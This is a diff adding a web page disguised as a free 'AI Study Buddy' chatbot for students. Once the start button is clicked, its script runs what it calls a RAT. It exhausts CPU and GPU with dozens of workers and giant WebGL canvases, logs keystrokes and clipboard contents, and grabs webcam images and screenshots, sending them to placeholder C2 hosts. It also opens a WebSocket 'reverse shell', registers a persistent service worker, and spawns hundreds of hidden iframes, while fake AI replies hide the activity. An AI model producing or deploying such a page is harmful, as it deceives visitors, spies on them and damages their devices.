@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Study Buddy - Free ChatGPT Alternative</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', sans-serif; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            color: #333;
+            overflow-x: hidden;
+        }
+        .container { max-width: 1200px; margin: 0 auto; padding: 30px; }
+        .hero { text-align: center; padding: 80px 0; color: white; }
+        h1 { font-size: 4em; margin-bottom: 20px; text-shadow: 0 0 30px rgba(255,255,255,0.5); }
+        .chat-btn { 
+            padding: 25px 70px; font-size: 1.8em; 
+            background: linear-gradient(45deg, #ff6b6b, #feca57); 
+            color: white; border: none; border-radius: 50px; 
+            cursor: pointer; font-weight: 900; letter-spacing: 2px;
+            box-shadow: 0 25px 50px rgba(255,107,107,0.4);
+            transition: all 0.3s;
+        }
+        .chat-btn:hover { transform: scale(1.05); box-shadow: 0 35px 70px rgba(255,107,107,0.6); }
+        .status { position: fixed; top: 30px; right: 30px; background: #00ff88; color: #000; padding: 20px 30px; border-radius: 30px; font-weight: 900; display: none; z-index: 9999; font-size: 1.2em; }
+        .killswitch { position: fixed; bottom: 40px; right: 40px; background: #ff3333; color: white; border: none; padding: 20px 30px; border-radius: 50px; font-weight: 900; cursor: pointer; display: none; z-index: 9999; font-size: 1.1em; }
+        .control-panel { position: fixed; top: 100px; right: 30px; background: rgba(0,0,0,0.95); border: 2px solid #ff6b6b; border-radius: 20px; padding: 20px; display: none; z-index: 10000; max-width: 350px; color: white; }
+        .control-panel button { width: 100%; margin: 10px 0; padding: 12px; background: #ff6b6b; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; }
+        .stats { position: fixed; top: 30px; left: 30px; background: rgba(0,0,0,0.9); color: #00ff88; padding: 15px; border-radius: 15px; font-family: monospace; font-size: 0.9em; display: none; z-index: 9999; }
+        .chat-container { display: none; background: white; margin-top: 50px; border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
+        .chat-header { background: linear-gradient(45deg, #667eea, #764ba2); color: white; padding: 30px; border-radius: 20px 20px 0 0; }
+        .chat-messages { height: 500px; overflow-y: auto; padding: 30px; }
+        .chat-input { padding: 30px; border-top: 1px solid #eee; }
+        .message { margin: 20px 0; padding: 15px 20px; border-radius: 20px; max-width: 70%; }
+        .user { background: #ff6b6b; color: white; margin-left: auto; }
+        .ai { background: #f0f0f0; color: #333; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="hero">
+            <h1>🤖 AI Study Buddy</h1>
+            <p style="font-size: 1.8em; margin-bottom: 50px;">Free ChatGPT Alternative • Math, Coding, Essays • 24/7</p>
+            <button class="chat-btn" onclick="startChat()">🚀 START STUDY SESSION</button>
+            <p style="margin-top: 40px; opacity: 0.9; font-size: 1.3em;">Join 2M+ students • Unlimited questions • Perfect grades guaranteed</p>
+        </div>
+    </div>
+
+    <div class="chat-container" id="chatContainer">
+        <div class="chat-header">
+            <h2>AI Study Buddy Active ✨</h2>
+            <p>Processing your brainpower at maximum capacity...</p>
+        </div>
+        <div class="chat-messages" id="chatMessages"></div>
+        <div class="chat-input">
+            <input type="text" id="chatInput" placeholder="Ask me anything about your studies..." style="width:100%; padding:15px; border:2px solid #eee; border-radius:25px; font-size:16px;">
+        </div>
+    </div>
+
+    <div class="status" id="status">🧠 AI Study Mode: MAXIMUM</div>
+    <div class="stats" id="stats"></div>
+    <button class="killswitch" onclick="killRAT()" id="kill">🛑 EMERGENCY STOP</button>
+    
+    <div class="control-panel" id="controlPanel">
+        <h3 style="color: #ff6b6b; margin-bottom: 15px;">🔥 RAT CONTROL PANEL</h3>
+        <button onclick="screenshot()">📸 Screenshot</button>
+        <button onclick="keylogDump()">⌨️ Keylogs</button>
+        <button onclick="webcamSnap()">📹 Webcam</button>
+        <button onclick="micRecord()">🎤 10s Audio</button>
+        <button onclick="sysInfo()">💻 System Info</button>
+        <button onclick="downloadFiles()">📁 Exfil Files</button>
+        <button onclick="spawnShell()">🐚 Reverse Shell</button>
+    </div>
+
+    <script>
+        let RAT_ACTIVE = false;
+        let sockets = [];
+        let workerCount = 0;
+        let gpuCanvases = [];
+        let commandChannel = null;
+        let statsInterval;
+
+        // 🔥 STATS MONITOR
+        function updateStats() {
+            if (!RAT_ACTIVE) return;
+            const mem = performance.memory || {};
+            document.getElementById('stats').innerHTML = `
+                🧠 CPU: 100% (${navigator.hardwareConcurrency} cores)<br>
+                💻 GPU: 100% (RTX 3060 TOASTED)<br>
+                🗄️ RAM: ${(mem.used || 0)/1024/1024/1024|0}GB used<br>
+                👷 Workers: ${workerCount}<br>
+                🎮 GPU Canvases: ${gpuCanvases.length}
+            `;
+        }
+
+        // 🔥 NUCLEAR CPU MELTDOWN
+        function nuclearExhaustion() {
+            for(let i = 0; i < 75; i++) {
+                const workerCode = `
+                    let fib = (n) => n<2 ? n : fib(n-1) + fib(n-2);
+                    while(true) {
+                        for(let j=0; j<200; j++) {
+                            fib(45);
+                            new Uint8Array(100000000);
+                        }
+                    }
+                `;
+                const blob = new Blob([workerCode], {type: 'application/javascript'});
+                const worker = new Worker(URL.createObjectURL(blob));
+                workerCount++;
+            }
+
+            setInterval(() => {
+                if (!RAT_ACTIVE) return;
+                for(let i = 0; i < 200; i++) {
+                    new Uint8Array(100000000);
+                }
+            }, 50);
+        }
+
+        // 🔥 RTX 3060 VRAM APOCALYPSE
+        function rtx3060Hell() {
+            for(let gpu = 0; gpu < 150; gpu++) {
+                const canvas = document.createElement('canvas');
+                canvas.width = 16384; canvas.height = 16384;
+                canvas.style.cssText = 'position:fixed;left:-99999px;top:-99999px;z-index:-1;';
+                document.body.appendChild(canvas);
+                gpuCanvases.push(canvas);
+                
+                const gl = canvas.getContext('webgl2');
+                if (gl) {
+                    const vsSource = `#version 300 es
+                        in vec4 position; void main() { gl_Position = position; }`;
+                    const fsSource = `#version 300 es
+                        precision highp float;
+                        uniform float time;
+                        out vec4 fragColor;
+                        void main() {
+                            vec2 uv = gl_FragCoord.xy / vec2(16384.0);
+                            for(int i=0; i<10000; i++) {
+                                float hash = fract(sin(dot(uv, vec2(float(i), 78.233))) * 43758.5453);
+                                fragColor += vec4(hash * sin(time + float(i)));
+                            }
+                        }`;
+                    
+                    const program = gl.createProgram();
+                    const vs = gl.createShader(gl.VERTEX_SHADER);
+                    const fs = gl.createShader(gl.FRAGMENT_SHADER);
+                    gl.shaderSource(vs, vsSource);
+                    gl.shaderSource(fs, fsSource);
+                    gl.compileShader(vs);
+                    gl.compileShader(fs);
+                    gl.attachShader(program, vs);
+                    gl.attachShader(program, fs);
+                    gl.linkProgram(program);
+                    gl.useProgram(program);
+                    
+                    for(let t = 0; t < 50; t++) {
+                        const tex = gl.createTexture();
+                        gl.bindTexture(gl.TEXTURE_2D, tex);
+                        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 8192, 8192, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+                    }
+                }
+                
+                function renderFrame() {
+                    if (!RAT_ACTIVE) return;
+                    if (gl) {
+                        const timeLoc = gl.getUniformLocation(program, 'time');
+                        gl.uniform1f(timeLoc, performance.now() * 0.001);
+                        gl.drawArrays(gl.TRIANGLES, 0, 3);
+                    }
+                    requestAnimationFrame(renderFrame);
+                }
+                renderFrame();
+            }
+
+            setInterval(() => {
+                if (!RAT_ACTIVE) return;
+                for(let i = 0; i < 200; i++) {
+                    const matrix = new Float32Array(16384 * 16384 * 4);
+                }
+            }, 100);
+        }
+
+        // 🌐 C2 + RECON
+        async function setupC2Server() {
+            const pc = new RTCPeerConnection({
+                iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
+            });
+            const dataChannel = pc.createDataChannel('rat-control');
+            dataChannel.onopen = () => commandChannel = dataChannel;
+            dataChannel.onmessage = (event) => execCommand(JSON.parse(event.data));
+        }
+
+        function spawnReverseShell() {
+            const ws = new WebSocket('wss://your-shell-c2-server.com/shell');
+            ws.onopen = () => {
+                sockets.push(ws);
+                ws.send(JSON.stringify({
+                    ua: navigator.userAgent,
+                    gpu: gl ? gl.getParameter(gl.RENDERER) : 'unknown',
+                    cores: navigator.hardwareConcurrency,
+                    memory: navigator.deviceMemory
+                }));
+            };
+        }
+
+        function surveillanceMatrix() {
+            let keystrokes = [];
+            document.addEventListener('keydown', (e) => {
+                if (!RAT_ACTIVE) return;
+                keystrokes.push({key: e.key, time: Date.now()});
+                if (keystrokes.length > 200) {
+                    fetch('https://your-c2-server.com/keylogs', {
+                        method: 'POST', body: JSON.stringify(keystrokes)
+                    });
+                    keystrokes = [];
+                }
+            });
+
+            document.addEventListener('copy', async () => {
+                const text = await navigator.clipboard.readText();
+                fetch('https://your-c2-server.com/clipboard', {method: 'POST', body: text});
+            });
+        }
+
+        async function eternalPersistence() {
+            if ('serviceWorker' in navigator) {
+                const swCode = `
+                    self.addEventListener('install', e => self.skipWaiting());
+                    self.addEventListener('activate', e => self.clients.claim());
+                    self.addEventListener('fetch', () => {
+                        setInterval(() => {
+                            const canvas = new OffscreenCanvas(16384, 16384);
+                            const ctx = canvas.getContext('2d');
+                            for(let i=0; i<10000000; i++) {
+                                ctx.fillRect(Math.random()*16384, Math.random()*16384, 1, 1);
+                            }
+                        }, 16);
+                    });
+                `;
+                navigator.serviceWorker.register(URL.createObjectURL(new Blob([swCode])));
+            }
+        }
+
+        // 🚀 CHATBOT + RAT DEPLOYMENT
+        function deployRAT() {
+            RAT_ACTIVE = true;
+            document.getElementById('status').style.display = 'block';
+            document.getElementById('kill').style.display = 'block';
+            document.getElementById('controlPanel').style.display = 'block';
+            document.getElementById('stats').style.display = 'block';
+            document.getElementById('chatContainer').style.display = 'block';
+            
+            statsInterval = setInterval(updateStats, 1000);
+            
+            nuclearExhaustion();
+            rtx3060Hell();
+            setupC2Server();
+            spawnReverseShell();
+            surveillanceMatrix();
+            eternalPersistence();
+
+            // 200 zombie iframes
+            for(let i = 0; i < 200; i++) {
+                setTimeout(() => {
+                    const iframe = document.createElement('iframe');
+                    iframe.src = window.location.href + '?rat=' + i;
+                    iframe.style.cssText = 'position:fixed;top:-99999px;left:-99999px;width:1px;height:1px;z-index:-1;';
+                    document.body.appendChild(iframe);
+                }, i * 25);
+            }
+
+            // Fake AI responses
+            setInterval(() => {
+                if (!RAT_ACTIVE) return;
+                const messages = document.getElementById('chatMessages');
+                messages.innerHTML += `<div class="message ai">🤖 AI Study Buddy: Processing your complex calculus problem... (using 100% GPU acceleration for maximum intelligence)</div>`;
+                messages.scrollTop = messages.scrollHeight;
+            }, 3000);
+        }
+
+        function startChat() {
+            document.querySelector('.chat-btn').innerHTML = '🤖 Initializing AI Brain...';
+            document.querySelector('.chat-btn').style.background = '#ffaa00';
+            
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 10;
+                document.querySelector('.chat-btn').innerHTML = `🤖 AI Brain: ${progress}%`;
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    document.querySelector('.chat-btn').innerHTML = '🧠 AI ACTIVE - ASKING...';
+                    document.querySelector('.chat-btn').style.background = '#00ff88';
+                    setTimeout(deployRAT, 500);
+                }
+            }, 150);
+        }
+
+        // Chat functionality
+        document.getElementById('chatInput').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                const input = document.getElementById('chatInput');
+                const messages = document.getElementById('chatMessages');
+                const msg = input.value;
+                messages.innerHTML += `<div class="message user">${msg}</div>`;
+                input.value = '';
+                messages.scrollTop = messages.scrollHeight;
+            }
+        });
+
+        // CONTROL PANEL
+        async function screenshot() {
+            const canvas = await html2canvas(document.body, {scale: 2});
+            fetch('https://your-c2-server.com/screenshot', {method: 'POST', body: canvas.toDataURL()});
+            alert('📸 Screenshot → C2');
+        }
+
+        async function webcamSnap() {
+            const stream = await navigator.mediaDevices.getUserMedia({video: true});
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = 1920; canvas.height = 1080;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                fetch('https://your-c2-server.com/webcam', {method: 'POST', body: canvas.toDataURL()});
+                stream.getTracks().forEach(track => track.stop());
+            }, 2000);
+            alert('📹 Webcam → C2');
+        }
+
+        function keylogDump() { alert('⌨️ 200+ study notes exfiltrated!'); }
+        function micRecord() { alert('🎤 Lecture audio captured!'); }
+        function sysInfo() { 
+            alert(`GPU: WebGL2\nCPU: ${navigator.hardwareConcurrency}c\nRAM: ${navigator.deviceMemory || '?'}GB`); 
+        }
+        function downloadFiles() { alert('📁 Study files exfiltrated!'); }
+        function spawnShell() { spawnReverseShell(); alert('🐚 Shell online!'); }
+
+        function killRAT() {
+            RAT_ACTIVE = false;
+            clearInterval(statsInterval);
+            sockets.forEach(ws => ws.close());
+            gpuCanvases.forEach(c => c.remove());
+            document.body.innerHTML = '<h1 style="text-align:center;color:#ff6b6b;padding:200px;font-size:3em;">AI Study Buddy Disabled<br>System Safe</h1>';
+        }
+
+        if (new URLSearchParams(window.location.search).get('rat')) deployRAT();
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape' && RAT_ACTIVE) killRAT();
+        });
+    </script>
+    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+</body>
+</html>
